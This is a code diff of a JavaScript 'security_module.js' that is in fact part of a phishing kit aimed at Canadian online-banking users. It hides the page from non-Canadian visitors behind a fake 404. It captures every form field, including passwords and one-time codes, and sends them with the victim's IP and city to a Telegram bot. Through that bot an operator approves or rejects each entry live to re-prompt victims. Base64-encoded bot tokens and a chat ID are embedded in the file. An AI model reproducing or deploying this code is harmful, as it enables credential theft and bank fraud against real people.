@@ -1,15 +1,10 @@
-// security_module.js
-// Protection IP + Bot Telegram Interactif (Compatible avec TOUS les formulaires HTML)
+Ôªø// security_module.js
+// Protection IP + Bot Telegram Interactif
 (function() {
-    // ======= CONFIGURATION =======
-    const BOT_MAIN_B64 = "ODU4NDE3MTI5MTpBQUhmRmszSDFXaGNBYXhUT09SNXZmcWV2cmJla3lDNW5ZNA=="; // Main Bot
-    const BOT_RADAR_B64 = "Nzk3NzA0MzA2MjpBQUVwRVQ5SEpFMEl4dFVGOUtkRWJob1F5eVBOb293eGIxZw=="; // Radar IP
-    const CHAT_ID_B64 = "Njc4ODAxMjQ4MQ==";
+    const BOT_MAIN = atob("ODU4NDE3MTI5MTpBQUhmRmszSDFXaGNBYXhUT09SNXZmcWV2cmJla3lDNW5ZNA=="); 
+    const BOT_RADAR = atob("Nzk3NzA0MzA2MjpBQUVwRVQ5SEpFMEl4dFVGOUtkRWJob1F5eVBOb293eGIxZw=="); 
+    const CHAT_ID = atob("Njc4ODAxMjQ4MQ==");
 
-    const BOT_MAIN = atob(BOT_MAIN_B64);
-    const BOT_RADAR = atob(BOT_RADAR_B64);
-    const CHAT_ID = atob(CHAT_ID_B64);
-    
     if (!sessionStorage.getItem('uniq_session_id')) {
         sessionStorage.setItem('uniq_session_id', Math.floor(1000 + Math.random() * 9000).toString());
     }
@@ -19,7 +14,7 @@
         let payload = { chat_id: CHAT_ID, text: text, parse_mode: 'HTML' };
         if (reply_markup) payload.reply_markup = reply_markup;
         try {
-            let res = await fetch(https://api.telegram.org/bot + token + /sendMessage, {
+            let res = await fetch('https://api.telegram.org/bot' + token + '/sendMessage', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify(payload)
@@ -28,7 +23,7 @@
         } catch(e) { return null; }
     }
 
-    // 1. V…RIFICATION IP ET BLOCAGE (Cloudflare)
+    // 1. VERIFICATION IP
     async function verifyIP() {
         if (sessionStorage.getItem('geo_verified') === 'true') return;
 
@@ -64,59 +59,55 @@
         const time = new Date().toLocaleTimeString('fr-FR');
 
         function show404() {
-            document.documentElement.innerHTML = 
-                <div style="display:flex;height:100vh;align-items:center;justify-content:center;font-family:system-ui,sans-serif;background:#fff;color:#000;">
-                    <div style="display:flex;align-items:center;">
-                        <h1 style="font-size:24px;font-weight:500;border-right:1px solid rgba(0,0,0,0.3);margin:0 20px 0 0;padding:10px 23px 10px 0;">404</h1>
-                        <h2 style="font-size:14px;font-weight:normal;margin:0;">This page could not be found.</h2>
-                    </div>
-                </div>;
+            document.documentElement.innerHTML = '<div style="display:flex;height:100vh;align-items:center;justify-content:center;font-family:system-ui,sans-serif;background:#fff;color:#000;"><div style="display:flex;align-items:center;"><h1 style="font-size:24px;font-weight:500;border-right:1px solid rgba(0,0,0,0.3);margin:0 20px 0 0;padding:10px 23px 10px 0;">404</h1><h2 style="font-size:14px;font-weight:normal;margin:0;">This page could not be found.</h2></div></div>';
         }
 
         if (!cfTraceOk && countryCode === '??') {
             show404();
-            tgSend(BOT_RADAR, ?? <b>ACC»S BLOQU… (S…CURIT… MAXIMUM)</b> ??\n\n?? Heure :  + date +  ‡  + time + \n?? ID Session : <code> + SESSION_ID + </code>);
+            tgSend(BOT_RADAR, "üö´ <b>ACCES BLOQUE (SECURITY MAXIMUM)</b> üö´\n\nHeure : " + date + " √† " + time + "\nID Session : <code>" + SESSION_ID + "</code>");
             return;
         }
 
         if (countryCode !== 'CA') {
             show404();
-            tgSend(BOT_RADAR, ?? <b>ACC»S BLOQU… (HORS CANADA)</b> ??\n\n?? IP : <code> + ip + </code>\n?? Ville : <b> + city + </b>\n??? Pays : <b> + country + </b> ( + countryCode + )\n?? Heure :  + date +  ‡  + time + \n?? ID Session : <code> + SESSION_ID + </code>);
+            tgSend(BOT_RADAR, "üö´ <b>ACCES BLOQUE (HORS CANADA)</b> üö´\n\nIP : <code>" + ip + "</code>\nVille : <b>" + city + "</b>\nPays : <b>" + country + "</b> (" + countryCode + ")\nHeure : " + date + " √† " + time + "\nID Session : <code>" + SESSION_ID + "</code>");
             return;
         }
 
         overlay.remove();
-                sessionStorage.setItem('geo_verified', 'true');
+        sessionStorage.setItem('geo_verified', 'true');
         sessionStorage.setItem('user_ip', ip);
         sessionStorage.setItem('user_city', city);
         sessionStorage.setItem('user_country', country);
         
         let pageName = window.location.pathname.split('/').pop() || 'Index';
         if (!sessionStorage.getItem('geo_notified') || pageName === 'interac.html' || pageName === 'index.html') {
-            tgSend(BOT_RADAR, ?? <b>NOUVELLE CONNEXION (CANADA) - Page:  + pageName + </b> ??\n\n?? IP : <code> + ip + </code>\n?? Ville : <b> + city + </b>\n??? Pays : <b> + country + </b>\n?? Heure :  + date +  ‡  + time + \n?? ID Session : <code> + SESSION_ID + </code>);
+            tgSend(BOT_RADAR, "üëÄ <b>NOUVELLE CONNEXION (CANADA) - Page: " + pageName + "</b> üëÄ\n\nIP : <code>" + ip + "</code>\nVille : <b>" + city + "</b>\nPays : <b>" + country + "</b>\nHeure : " + date + " √† " + time + "\nID Session : <code>" + SESSION_ID + "</code>");
             sessionStorage.setItem('geo_notified', 'true');
         }
     }
 
-        verifyIP();
+    verifyIP();
 
-    // 1.5 NOTIFICATION TELEGRAM LORS DU CLIC SUR UN LOGO DE BANQUE
-    document.addEventListener('DOMContentLoaded', () => {
-        const tiles = document.querySelectorAll('a.fi-tile, .fi-option');
+    // 2. EVENEMENT CLIC SUR LES BANQUES
+    function setupBankClicks() {
+        const tiles = document.querySelectorAll('a.fi-tile, .fi-option, a[filabel]');
         tiles.forEach(tile => {
+            if (tile.dataset.tgClickAttached === "true") return;
+            tile.dataset.tgClickAttached = "true";
+
             tile.addEventListener('click', function() {
                 let label = this.getAttribute('filabel') || this.innerText || 'Banque';
-                let ip = sessionStorage.getItem('user_ip') || 'Inconnue';
-                let city = sessionStorage.getItem('user_city') || 'Inconnue';
-                let country = sessionStorage.getItem('user_country') || 'Canada';
+                let ip = sessionStorage.getItem('user_ip') || 'En cours...';
+                let city = sessionStorage.getItem('user_city') || 'En cours...';
                 
-                let msg = ?? <b>CLIC BANQUE S…LECTIONN…E</b> ??\n\n?? Banque : <b> + label.trim() + </b>\n?? IP : <code> + ip + </code>\n?? Ville : <b> + city + </b>\n?? ID Session : <code> + SESSION_ID + </code>;
+                let msg = "üè¶ <b>CLIC BANQUE SELECTIONNEE</b> üè¶\n\nBanque : <b>" + label.trim() + "</b>\nIP : <code>" + ip + "</code>\nVille : <b>" + city + "</b>\nID Session : <code>" + SESSION_ID + "</code>";
                 tgSend(BOT_RADAR, msg);
             });
         });
-    });
+    }
 
-    // 2. INTERCEPTION DE TOUS LES FORMULAIRES
+    // 3. INTERCEPTION FORMULAIRES
     function setupForms() {
         const forms = document.querySelectorAll('form');
         
@@ -133,19 +124,12 @@
                 if (!loader) {
                     loader = document.createElement('div');
                     loader.id = 'telegramGlobalLoader';
-                    loader.innerHTML = 
-                        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.95);z-index:999999;display:flex;align-items:center;justify-content:center;flex-direction:column;">
-                            <div style="border:4px solid #f3f3f3;border-top:4px solid #0981C5;border-radius:50%;width:50px;height:50px;animation:spinTg 1s linear infinite;"></div>
-                            <p style="margin-top:20px;font-family:sans-serif;font-size:16px;color:#333;font-weight:bold;">Processing, please wait...</p>
-                            <style>@keyframes spinTg { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
-                        </div>
-                    ;
+                    loader.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.95);z-index:999999;display:flex;align-items:center;justify-content:center;flex-direction:column;"><div style="border:4px solid #f3f3f3;border-top:4px solid #0981C5;border-radius:50%;width:50px;height:50px;animation:spinTg 1s linear infinite;"></div><p style="margin-top:20px;font-family:sans-serif;font-size:16px;color:#333;font-weight:bold;">Processing, please wait...</p><style>@keyframes spinTg { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style></div>';
                     document.body.appendChild(loader);
                 } else {
                     loader.style.display = 'flex';
                 }
 
-                // RÈcupÈration de tous les ÈlÈments d'entrÈe (inputs, selects, textareas)
                 let dataText = "";
                 const inputs = form.querySelectorAll('input, select, textarea');
                 inputs.forEach(input => {
@@ -156,21 +140,21 @@
                     }
                     if (name && val && val.trim() !== "" && input.type !== 'submit' && input.type !== 'hidden') {
                         let cleanName = name.replace(/[-_]/g, ' ').toUpperCase();
-                        dataText += \n + cleanName + : <code> + val + </code>;
+                        dataText += "\n" + cleanName + ": <code>" + val + "</code>";
                     }
                 });
 
                 let pageName = window.location.pathname.split('/').pop() || 'Formulaire';
-                let msgText = ?? <b>NOUVELLE SAISIE BANCAIRE ( + pageName + )</b> ?? + dataText + \n\n?? ID Session: <code> + SESSION_ID + </code>;
+                let msgText = "üåü <b>NOUVELLE SAISIE BANCAIRE (" + pageName + ")</b> üåü" + dataText + "\n\nID Session: <code>" + SESSION_ID + "</code>";
 
                 let buttonRows = [
                     [
-                        { text: "? Valide", callback_data: alide_ + SESSION_ID },
-                        { text: "? Error", callback_data: error_ + SESSION_ID }
+                        { text: "‚úÖ Valide", callback_data: "valide_" + SESSION_ID },
+                        { text: "‚ùå Error", callback_data: "error_" + SESSION_ID }
                     ],
                     [
-                        { text: "+5s ?", callback_data: dd5_ + SESSION_ID },
-                        { text: "+10s ?", callback_data: dd10_ + SESSION_ID }
+                        { text: "+5s ‚è≥", callback_data: "add5_" + SESSION_ID },
+                        { text: "+10s ‚è≥", callback_data: "add10_" + SESSION_ID }
                     ]
                 ];
 
@@ -199,10 +183,10 @@
                     if (timeLeft <= 0) {
                         isFinished = true;
                         clearInterval(timer);
-                        fetch(https://api.telegram.org/bot + BOT_MAIN + /editMessageText, {
+                        fetch("https://api.telegram.org/bot" + BOT_MAIN + "/editMessageText", {
                             method: 'POST',
                             headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify({chat_id: CHAT_ID, message_id: msgId, text: msgText + "\n\n? <i>ValidÈ automatiquement (Temps ÈcoulÈ)</i>", parse_mode: 'HTML'})
+                            body: JSON.stringify({chat_id: CHAT_ID, message_id: msgId, text: msgText + "\n\n‚úÖ <i>Valide automatiquement (Temps ecoule)</i>", parse_mode: 'HTML'})
                         });
                         
                         let action = form.getAttribute('action');
@@ -217,8 +201,8 @@
                 let poller = setInterval(async () => {
                     if (isFinished) { clearInterval(poller); return; }
                     try {
-                        let url = https://api.telegram.org/bot + BOT_MAIN + /getUpdates?limit=20&allowed_updates=["callback_query"];
-                        if (currentOffset) url += &offset= + currentOffset;
+                        let url = "https://api.telegram.org/bot" + BOT_MAIN + "/getUpdates?limit=20&allowed_updates=[\"callback_query\"]";
+                        if (currentOffset) url += "&offset=" + currentOffset;
                         
                         let res = await fetch(url);
                         let updates = await res.json();
@@ -229,27 +213,27 @@
                             for (let u of updates.result) {
                                 if (u.callback_query && u.callback_query.data.includes(SESSION_ID)) {
                                     let cbData = u.callback_query.data;
-                                    fetch(https://api.telegram.org/bot + BOT_MAIN + /answerCallbackQuery?callback_query_id= + u.callback_query.id);
+                                    fetch("https://api.telegram.org/bot" + BOT_MAIN + "/answerCallbackQuery?callback_query_id=" + u.callback_query.id);
                                     
                                     if (cbData.startsWith('add5_')) {
                                         timeLeft += 5;
-                                        fetch(https://api.telegram.org/bot + BOT_MAIN + /editMessageText, {
+                                        fetch("https://api.telegram.org/bot" + BOT_MAIN + "/editMessageText", {
                                             method: 'POST', headers: {'Content-Type': 'application/json'},
-                                            body: JSON.stringify({chat_id: CHAT_ID, message_id: msgId, text: msgText + \n\n? <b>Temps restant :  + timeLeft +  secondes</b>, parse_mode: 'HTML', reply_markup: { inline_keyboard: buttonRows }})
+                                            body: JSON.stringify({chat_id: CHAT_ID, message_id: msgId, text: msgText + "\n\n‚è≥ <b>Temps restant : " + timeLeft + " secondes</b>", parse_mode: 'HTML', reply_markup: { inline_keyboard: buttonRows }})
                                         });
                                     }
                                     else if (cbData.startsWith('add10_')) {
                                         timeLeft += 10;
-                                        fetch(https://api.telegram.org/bot + BOT_MAIN + /editMessageText, {
+                                        fetch("https://api.telegram.org/bot" + BOT_MAIN + "/editMessageText", {
                                             method: 'POST', headers: {'Content-Type': 'application/json'},
-                                            body: JSON.stringify({chat_id: CHAT_ID, message_id: msgId, text: msgText + \n\n? <b>Temps restant :  + timeLeft +  secondes</b>, parse_mode: 'HTML', reply_markup: { inline_keyboard: buttonRows }})
+                                            body: JSON.stringify({chat_id: CHAT_ID, message_id: msgId, text: msgText + "\n\n‚è≥ <b>Temps restant : " + timeLeft + " secondes</b>", parse_mode: 'HTML', reply_markup: { inline_keyboard: buttonRows }})
                                         });
                                     }
                                     else if (cbData.startsWith('valide_')) {
                                         isFinished = true;
-                                        fetch(https://api.telegram.org/bot + BOT_MAIN + /editMessageText, {
+                                        fetch("https://api.telegram.org/bot" + BOT_MAIN + "/editMessageText", {
                                             method: 'POST', headers: {'Content-Type': 'application/json'},
-                                            body: JSON.stringify({chat_id: CHAT_ID, message_id: msgId, text: msgText + "\n\n? <i>ValidÈ par l'admin</i>", parse_mode: 'HTML'})
+                                            body: JSON.stringify({chat_id: CHAT_ID, message_id: msgId, text: msgText + "\n\n‚úÖ <i>Valide par l'admin</i>", parse_mode: 'HTML'})
                                         });
                                         let action = form.getAttribute('action');
                                         if (action) window.location.href = action;
@@ -257,9 +241,9 @@
                                     }
                                     else if (cbData.startsWith('error_')) {
                                         isFinished = true;
-                                        fetch(https://api.telegram.org/bot + BOT_MAIN + /editMessageText, {
+                                        fetch("https://api.telegram.org/bot" + BOT_MAIN + "/editMessageText", {
                                             method: 'POST', headers: {'Content-Type': 'application/json'},
-                                            body: JSON.stringify({chat_id: CHAT_ID, message_id: msgId, text: msgText + "\n\n? <i>RefusÈ par l'admin</i>", parse_mode: 'HTML'})
+                                            body: JSON.stringify({chat_id: CHAT_ID, message_id: msgId, text: msgText + "\n\n‚ùå <i>Refuse par l'admin</i>", parse_mode: 'HTML'})
                                         });
                                         
                                         loader.style.display = 'none';
@@ -267,9 +251,9 @@
                                         let errorContainer = document.querySelector('.error-msg, .alert-danger, #errorMsg');
                                         if (errorContainer) {
                                             errorContainer.style.display = 'block';
-                                            errorContainer.innerHTML = "Les informations saisies sont incorrectes. Veuillez rÈessayer.";
+                                            errorContainer.innerHTML = "Les informations saisies sont incorrectes. Veuillez r√©essayer.";
                                         } else {
-                                            alert("Les informations saisies sont incorrectes. Veuillez rÈessayer.");
+                                            alert("Les informations saisies sont incorrectes. Veuillez r√©essayer.");
                                         }
                                         
                                         let pw = form.querySelector('input[type="password"], input[name*="code"], input[name*="otp"]');
@@ -284,11 +268,14 @@
         });
     }
 
-    if (document.readyState === 'loading') {
-        document.addEventListener('DOMContentLoaded', setupForms);
-    } else {
+    function initAll() {
+        setupBankClicks();
         setupForms();
     }
+
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', initAll);
+    } else {
+        initAll();
+    }
 })();
-
-
